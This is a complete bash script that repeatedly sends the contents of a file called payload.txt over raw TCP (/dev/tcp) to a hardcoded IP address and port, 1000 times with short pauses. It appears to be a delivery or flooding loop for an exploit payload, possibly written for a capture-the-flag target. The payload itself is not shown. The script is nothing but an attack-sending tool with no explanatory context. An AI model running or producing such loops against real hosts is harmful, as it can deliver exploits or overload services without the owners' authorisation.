#!/bin/bash

for i in {1..1000}
do
	echo "$i"
	sleep 0.01
	cat payload.txt > /dev/tcp/125.131.189.33/10207
done


